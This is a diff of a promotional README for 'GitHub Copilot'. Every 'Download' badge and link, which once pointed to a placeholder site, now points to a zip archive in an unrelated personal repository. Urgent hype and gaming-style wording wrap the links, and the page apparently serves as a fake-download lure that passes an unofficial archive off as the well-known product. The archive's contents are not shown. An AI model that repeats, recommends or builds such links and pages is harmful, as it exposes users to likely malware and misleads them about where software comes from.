@@ -4,7 +4,7 @@
 
 > Microsoft and GitHub's flagship AI coding assistant — now with multi-model support, Copilot Workspace, and agentic capabilities making it the most widely adopted AI dev tool of 2026.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/rohillavansh240-a11y/github-copilot/main/epilogistic/github-copilot-v2.7.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **All platforms (VS Code, JetBrai
 
 ### Ready to play / use?
 
-[![Download GitHub Copilot](https://img.shields.io/badge/Download-GitHub%20Copilot-brightgreen?style=for-the-badge)](https://download.com)
+[![Download GitHub Copilot](https://img.shields.io/badge/Download-GitHub%20Copilot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rohillavansh240-a11y/github-copilot/main/epilogistic/github-copilot-v2.7.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/rohillavansh240-a11y/github-copilot/main/epilogistic/github-copilot-v2.7.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ GitHub Copilot is one of the **most hyped releases of Summer 2026** — trending
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/rohillavansh240-a11y/github-copilot/main/epilogistic/github-copilot-v2.7.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ GitHub Copilot is one of the **most hyped releases of Summer 2026** — trending
 
 **Don't miss out — GitHub Copilot is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-GitHub%20Copilot-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-GitHub%20Copilot-blue?style=for-the-badge)](https://raw.githubusercontent.com/rohillavansh240-a11y/github-copilot/main/epilogistic/github-copilot-v2.7.zip)
 
 *GitHub Copilot — Available Now · All platforms (VS Code, JetBrains, Neovim & more)*
 
